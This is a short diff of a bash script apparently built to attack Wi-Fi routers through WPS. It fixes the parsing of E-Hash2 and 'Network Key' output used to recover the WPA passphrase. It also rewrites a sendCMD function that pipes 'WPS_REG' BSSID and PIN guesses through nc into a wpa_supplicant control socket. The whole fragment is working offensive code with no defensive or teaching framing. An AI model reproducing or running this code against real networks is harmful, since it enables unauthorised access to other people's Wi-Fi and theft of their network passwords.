@@ -93,7 +93,7 @@ function attack()
 			then
 				EHASH2=$(gethex "$LINE")
 				printG "E-Hash2: $EHASH2"
-			elif [[ $LINE =~ "Networki\ Key" ]]
+			elif [[ $LINE =~ "Network Key" ]]
 			then
 				WPA_KEY=$(gethex "$LINE")
 				printG "WPA pass: $WPA_KEY"
@@ -139,9 +139,8 @@ function attack()
 
 function sendCMD()
 {
-	CMD="WPS_REG "${BSSID}\ ${PIN}
-	echo "$CMD" | tee >(nc -u -U $TEMPDIR/$IFACE) &
-	printI "$PIN"
+	echo -n "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &
+	printI "Trying pin: $PIN"
 }
 function gethex()
 {
